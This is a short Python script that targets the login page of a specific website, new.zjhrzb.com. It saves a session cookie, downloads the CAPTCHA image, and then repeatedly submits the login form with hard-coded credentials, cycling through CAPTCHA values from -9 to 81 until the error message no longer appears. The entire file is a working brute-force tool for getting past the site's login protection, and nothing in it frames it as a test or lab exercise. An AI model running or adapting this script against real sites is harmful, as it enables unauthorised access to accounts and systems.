import http.client
import http.cookiejar
import urllib.parse

login_url = "http://new.zjhrzb.com/user/doLogin.html"
vali_url = "http://new.zjhrzb.com/validimg.html"
vali_code_err_tip = "验证码错误"


def login(opener, user, passwd, validcode):
    params = urllib.parse.urlencode({'username': user,
                                     'password': passwd,
                                     'valicode': validcode,
                                     'actionType': 'login',
                                     'redirectURL': '/member/index.html',
                                     'openId': '',
                                     'openType': ''})
    data = params.encode('utf-8')
    # conn = http.client.HTTPConnection("new.zjhrzb.com")
    # conn.request("GET",
    #               "http://new.zjhrzb.com/user/doLogin.html",
    #              params)
    # resp = conn.getresponse()
    # print(resp.status, resp.reason)
    request = urllib.request.Request(login_url, data)
    resp = opener.open(request)
    resp_all = (resp.read().decode('utf-8'))
    ret = resp_all.find(vali_code_err_tip)
    # print(resp_all)
    if (-1 != ret):
        print("Try valid code", validcode, 'login failure')
    else:
        print("Valid=", validcode, 'bingo')
    return ret

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
# let server rememer me
req = opener.open("http://new.zjhrzb.com/user/login.html?username=test&password=test12345678&valicode=-6&actionType=login&redirectURL=index.html&openId=&openType=")

# request validate url
request = urllib.request.Request(vali_url)
resp_img = opener.open(request)
for name, value in request.header_items():
    print(name, value)
with open("validimg.jpg", "wb") as f:
    f.write(resp_img.read())

# Brute force the valid code
for i in range(-9, 82):
    ret = login(opener, 'test', 'test12345678', i)
    if (ret == -1):
        print("login suceess")
        break
